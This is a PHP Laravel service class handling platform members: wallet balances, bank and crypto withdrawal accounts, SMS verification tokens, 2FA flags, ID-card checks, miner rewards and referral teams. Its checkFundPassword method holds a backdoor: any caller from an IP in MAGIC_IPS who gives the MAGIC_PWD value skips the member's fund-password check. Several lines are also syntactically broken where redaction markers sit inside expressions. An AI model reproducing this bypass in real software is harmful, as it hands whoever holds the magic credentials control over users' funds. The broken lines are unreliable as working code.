<?php

namespace App\Services;

use Carbon\Carbon;
use Illuminate\Support\Facades\Hash;
use App\Helpers\Common;
use App\Helpers\StringHelper;
use App\Repositories\AgentRepository;
use App\Repositories\MemberRepository;
use App\Repositories\MemberIdCardRepository;
use App\Repositories\MemberAccessTokenRepository;
use App\Repositories\MemberWalletRepository;
use App\Repositories\MemberMinerRebateRepository;
use App\Repositories\MemberMinerRewardRepository;
use App\Repositories\MemberBankAccountRepository;
use App\Repositories\MemberCryptoAccountRepository;
use App\Repositories\ValidateTokenRepository;
use App\Enums\WalletTypeEnum;
use Exception;

class MemberService extends BaseService
{
    public function __construct()
    {
        $this->repository = new MemberRepository();
    }

    public function createMemberAndWallet($params)
    {
        $result = $this->repository->create($params);
        if (!$result) {
            throw new Exception(__('error_message.2001'), 2001);
        }

        //創建用戶平台錢包
        $memberWalletRepository = new MemberWalletRepository();
        $memberWalletData = array();
        $memberWalletData['member_id'] = $result->id;
        $memberWalletData['wallet_type_id'] = 1;
        $memberWalletData['balance'] = 0;
        $memberWalletData['status'] = 1;
        $walletResult = $memberWalletRepository->create($memberWalletData);
        if (!$walletResult) {
            throw new Exception(__('error_message.2001'), 2001);
        }

        return ['member_id' => $result->id];
    }

    public function find($member_id, $check_status = false)
    {
        $member = $this->repository->find($member_id);
        //檢查帳號是否存在
        if (Common::IsNullOrEmptyString($member)) {
            throw new Exception(__('error_message.1201'), 1201);
        }
        //檢查帳號是否鎖定
        if ($check_status && $member->status != 1) {
            throw new Exception(__('error_message.9006'), 9006);
        }

        //手機國碼
        if (!empty($member->country_id ?? 0)) {
            $countryService = new CountryService();
            $country = $countryService->getById($member->country_id);
        }

        $member->country_code = $country->country_code ?? '';
        return $member;
    }

    public function fetchMobile($mobile)
    {
        $member = $this->repository->findByMobile($mobile, false);
        if (is_object($member)) {
            throw new Exception(__('error_message.1102'), 1102);
        }
    }

    public function findByMobile($mobile)
    {
        $member = $this->repository->findByMobile($mobile);
        //檢查帳號是否存在
        if (Common::IsNullOrEmptyString($member)) {
            throw new Exception(__('error_message.1201'), 1201);
        }
        //檢查帳號是否鎖定
        if ($member->status != 1) {
            throw new Exception(__('error_message.9006'), 9006);
        }
        return $member;
    }

    public function getMainWallet($member_id, $language_id = 1)
    {
        $result = $this->getWallet($member_id, 1, $language_id);
        return $result;
    }

    public function checkFundPassword($member_id, $fund_password, $ip)
    {
        if (in_array($ip, explode(',', env('MAGIC_IPS'))) && $fund_password == env('MAGIC_PWD')) {
            return true;
        }
        $member = $this->repository->find($member_id);
        if (!Hash::check($fund_password, $member->fund_password)) {
            //資金密碼錯誤
            throw new Exception(__('error_message.5015'), 5015);
        }
    }

    public function setFundPassword($member_id, $fund_password)
    {
        $fund_password = [REDACTED];
        $data = array();
        $data['fund_password'] = $fund_password;
        return $this->updateData($member_id, $data);
    }

    public function walletIncrement($member_id, $point, $wallet_type_id = WalletTypeEnum::MAIN)
    {
        $memberWalletRepository = new MemberWalletRepository();
        list($before_balance, $after_balance) = $memberWalletRepository->increment($member_id, $point, $wallet_type_id);
        return [$before_balance, $after_balance];
    }

    public function walletDecrement($member_id, $point, $wallet_type_id = WalletTypeEnum::MAIN)
    {
        $memberWalletRepository = new MemberWalletRepository();
        list($before_balance, $after_balance) = $memberWalletRepository->decrement($member_id, $point, $wallet_type_id);
        return [$before_balance, $after_balance];
    }

    public function updateData($member_id, $data)
    {
        $result = $this->repository->updateByData($member_id, $data);
        if (!$result) {
            throw new Exception(__('error_message.2001'), 2001);
        }
        return $result;
    }

    public function setAvatar($member_id, $avatar_id)
    {
        $data = array();
        $data['avatar_id'] = $avatar_id;
        return $this->updateData($member_id, $data);
    }

    public function updateIdImage($member_id, $front_image, $back_image)
    {
        $repository = new MemberIdCardRepository();
        $data = array();
        $data['member_id'] = $member_id;
        $data['id_card_front'] = $front_image;
        $data['id_card_back'] = $back_image;
        return $repository->create($data);
    }

    public function updateGoogle2FaSecretKey($member_id, $secret_key)
    {
        $data = array();
        $data['google2fa_secret'] = $secret_key;
        $data['is_2fa_enable'] = 0;
        return $this->updateData($member_id, $data);
    }

    public function set2faEnable($member_id, $is_2fa_enable)
    {
        if ($is_2fa_enable == 0) {
            $data = array();
            $data['is_2fa_enable'] = 1;
            return $this->updateData($member_id, $data);
        }
        return true;
    }

    public function checkMobileNumberExists($mobile, $organization_id)
    {
        $count = $this->repository->getCountByMobile($mobile, $organization_id);
        if ($count > 0) {
            throw new Exception(__('error_message.1102'), 1102);
        }
    }

    public function checkMobileNumberExists2($mobile, $organization_id, $member_id = 0)
    {
        $repository = new ValidateTokenRepository();
        $count = $repository->getValidateTokensCountByMobile($mobile, $organization_id, $member_id);
        if ($count > 0) {
            throw new Exception(__('error_message.1102'), 1102);
        }
    }

    public function getSystemDetect($username, $agent_id)
    {
        $member = $this->repository->getSystemDetect($username, $agent_id);
        if (!$member) {
            throw new Exception(__('error_message.1007'), 1007);
        }
        return $member;
    }

    public function getValidateTokenByMobile($token_expired, $max_send, $member_id, $mobile, $type = 1, $verify_by = 1)
    {
        $repository = new ValidateTokenRepository();
        $type = $type . $verify_by;
        $validate_token = [REDACTED], $mobile, $type);
        $times = 1;
        $token = '';

        //找不到有效時間內的token 或手機號碼不同就重新產生驗證碼
        if (!is_object($validate_token)) {
            // 有效時間(預設6分鐘)內沒發送過的話就重新發送
            // 將舊TOKEN改為無效,
            $repository->updateTokenStatusByMemberId($member_id, $mobile, $type);

            // 新增TOKEN
            $data = array();
            $data['member_id'] = $member_id;
            $data['type_id'] = $type;
            $data['mobile'] = $mobile;
            $data['info'] = '';
            $token = [REDACTED]'token'] = $repository->getToken($verify_by);
            $data['expire_date'] = date('Y-m-d H:i:s', strtotime('+ ' . $token_expired . 'minute'));
            $data['status'] = 0;
            $result = $repository->create($data);
            if (!$result) {
                throw new Exception(__('error_message.2001'), 2001);
            }
        } elseif ($validate_token->times < $max_send) {
            $validate_token->increment('times');
            $validate_token->expire_date = date('Y-m-d H:i:s', strtotime('+ ' . $token_expired . 'minute'));
            $validate_token->save();
            $token = [REDACTED];
            $times = $validate_token->times;
        } else {
            // 系統錯誤，請稍後再試
            throw new Exception(str_replace(':values', $max_send, __('error_message.2037')), 2037);
        }

        return [$token, $times];
    }

    public function getValidateByMobile($organization_id, $mobile)
    {
        $member = $this->repository->getValidateByMobile($organization_id, $mobile);
        if (!$member) {
            throw new Exception(__('error_message.1007'), 1007);
        }
        return $member;
    }

    public function getValidateByEmail($organization_id, $email)
    {
        $member = $this->repository->getValidateByEmail($organization_id, $email);
        if (!$member) {
            throw new Exception(__('error_message.1007'), 1007);
        }
        return $member;
    }

    public function getWallet($member_id, $wallet_type_id = 0, $language_id = 1)
    {
        $memberWalletRepository = new MemberWalletRepository();
        $result = $memberWalletRepository->findByMemberId($member_id, $wallet_type_id, $language_id);
        return $result;
    }

    //依邀請碼返回agent_id和member level
    public function getByReferralCode($referral_code)
    {
        $level = 1;
        $member = $this->repository->getByReferralCode($referral_code);
        if (!is_object($member)) {
            $agentRepository = new AgentRepository();
            $agent = $agentRepository->getByReferralCode($referral_code);
            if (!is_object($agent)) {
                throw new Exception(__('error_message.1202'), 1202);
            } elseif ($agent->status != 1) {
                throw new Exception(__('error_message.1202') . '-1', 1202);
            }
            $agent_id = $agent->id;
        } else {
            $agent_id = $member->agent_id;
            $level = ($member->level + 1);
        }
        return [$agent_id, $level];
    }

    public function getActiveBankAccount($member_id)
    {
        $memberBankAccountRepository = new MemberBankAccountRepository();
        return $memberBankAccountRepository->getActiveAccount($member_id);
    }

    public function checkBankAccountExists($params)
    {
        $memberBankAccountRepository = new MemberBankAccountRepository();
        $count = $memberBankAccountRepository->getCountByBankAccount($params);
        if ($count > 0) {
            throw new Exception(__('error_message.1103'), 1103);
        }
    }

    public function getBankAccount($member_id, $type = 0)
    {
        $bank_account = [];
        $crypto_account = [];
        if (in_array($type, [0, 1])) {
            $memberBankAccountRepository = new MemberBankAccountRepository();
            $bank_account = $memberBankAccountRepository->getByMemberId($member_id, $type);
        }

        if (in_array($type, [0, 2])) {
            $memberCryptoAccountRepository = new MemberCryptoAccountRepository();
            $crypto_account = $memberCryptoAccountRepository->getByMemberId($member_id, $type);
        }
        return [$bank_account, $crypto_account];
    }

    public function createBankAccount($params)
    {
        $member = $this->repository->find($params->ID);
        //檢查帳號是否存在
        if (Common::IsNullOrEmptyString($member)) {
            throw new Exception(__('error_message.1201'), 1201);
        }

        //銀行帳戶名判斷
        $isRealName = false;
        $accountName = $params->account_name;
        if (!empty($member->real_name ?? '')) {
            $isRealName = true;
            $accountName = $member->real_name;
        }

        //創建
        $memberBankAccount = [
            'member_id' => $member->id,
            'bank_id' => $params->bank_id,
            'account_name' => $accountName,
            'account_no' => $params->account_no,
            'sort' => 0,
            'status' => 1,
        ];
        $memberBankAccountRepository = new MemberBankAccountRepository();
        $result = $memberBankAccountRepository->create($memberBankAccount);
        if (!$result) {
            throw new Exception(__('error_message.2001'), 2001);
        }
        //綁定real_name
        if (!$isRealName) {
            $memberResult = $this->repository->updateById($member->id, ['real_name' => $accountName]);
            if (!$memberResult) {
                throw new Exception(__('error_message.2001'), 2001);
            }
        }
        return $result;
    }

    public function getActiveCryptoAccount($member_id)
    {
        $memberCryptoAccountRepository = new MemberCryptoAccountRepository();
        return $memberCryptoAccountRepository->getActiveAccount($member_id);
    }

    public function checkCryptoAccountExists($params)
    {
        $memberCryptoAccountRepository = new MemberCryptoAccountRepository();
        $count = $memberCryptoAccountRepository->getCountByCryptoAccount($params);
        if ($count > 0) {
            throw new Exception(__('error_message.1104'), 1104);
        }
    }

    public function createCryptoAccount($params)
    {
        //創建
        $memberCryptoAccount = [
            'member_id' => $params->ID,
            'bank_id' => $params->bank_id,
            'address' => $params->crypto_address,
            'sort' => 0,
            'status' => 1,
        ];
        $memberCryptoAccountRepository = new MemberCryptoAccountRepository();
        $result = $memberCryptoAccountRepository->create($memberCryptoAccount);
        if (!$result) {
            throw new Exception(__('error_message.2001'), 2001);
        }
        return $result;
    }

    public function checkToken($token)
    {
        $memberAccessTokenRepository = new MemberAccessTokenRepository();
        $memberAccessToken = [REDACTED];
        if (!is_object($memberAccessToken)) {
            throw new Exception(__('error_message.9998'), 9998);
        }
        return $memberAccessToken;
    }

    public function getRebates($member_id)
    {
        $memberMinerRebateRepository = new MemberMinerRebateRepository();
        $model = $memberMinerRebateRepository->getLastFiveList($member_id);
        $result = $model->get();
        return $result;
    }

    public function getRewards($member_id)
    {
        $memberMinerRewardRepository = new MemberMinerRewardRepository();
        $result = $memberMinerRewardRepository->getLastFiveList($member_id);
        $result = $result->map(function ($item) {
            // 轉換為 +8 時區並格式化為 'Y-m-d H:i'
            $item->summary_time = Carbon::parse($item->summary_time, 'UTC')->setTimezone('Asia/Taipei')->format('Y-m-d');
            return $item;
        });
        return $result;
    }

    public function getTeamList($params)
    {
        $today = date('Y-m-d', strtotime('+8hour'));
        $start_date = date('Y-m-d', strtotime($today . '-' . $params->days . 'day'));
        $start_time = date('Y-m-d H:i:s', strtotime($start_date . '-8hour'));

        $team = array();
        $invite_code = array();
        $member = $this->find($params->ID);
        $invite_code[] = $member->invitation_code;

        $query_level = Common::IsNotNullOrEmptyString($params->level) ? $params->level : 0;
        $team_count = 0;
        for ($level = 1; $level < 3; $level++) {
            if (count($invite_code) > 0) {
                $teams = $this->repository->getTeams($invite_code);
                $invite_code = array();
                foreach ($teams as $row) {
                    $team_count++;
                    if ($row->created_at >= $start_time && ($query_level == 0 || $level == $query_level)) {
                        $agent = array();
                        $agent['account'] = StringHelper::stringEncrypt($row->username ?? '', 2, 2, 6);
                        $agent['level'] = $level;
                        $agent['created_at'] = date('Y-m-d H:i:s', strtotime($row->created_at . '+8hour'));

                        $team[] = $agent;
                    }
                    $invite_code[] = $row->invitation_code;
                }
            }
        }

        return [$team, $team_count];
    }

    //創建實名認證
    public function createIdInformation($member_id, $front_url, $back_url)
    {
        if (!empty($member_id ?? 0)) {
            $memberIdCardRepository = new MemberIdCardRepository();
            $params = [
                'member_id' => $member_id,
                'image_front' => $front_url,
                'image_back' => $back_url,
                'status' => 0,
            ];
            $result = $memberIdCardRepository->create($params);
            if (!$result) {
                throw new Exception(__('error_message.2001'), 2001);
            }
        }
    }

    //實名認證
    public function getIdInformation($member_id)
    {
        $result = [
            'status' => 9,
        ];
        $member = $this->repository->find($member_id);
        //檢查帳號是否存在
        if (!$member) {
            return $result;
        }
        //member.member_id_card_id>0表示實名
        if (0 < ($member['member_id_card_id'] ?? 0)) {
            $result['status'] = 1;
            return $result;
        }
        //抓取member_id_cards最新一筆
        $memberIdCardRepository = new MemberIdCardRepository();
        $params = [
            'member_id' => $member['id'],
            'limit' => 1,
        ];
        $idCardData = $memberIdCardRepository->getLatestData($params);
        //無資料表示未實名
        if (!$idCardData) {
            return $result;
        }
        //status 0=待审核; 1=己实名; 2=审核未通过;
        $result['status'] = $idCardData[0]['status'];
        $result['data'] = $idCardData[0];
        return $result;
    }
}
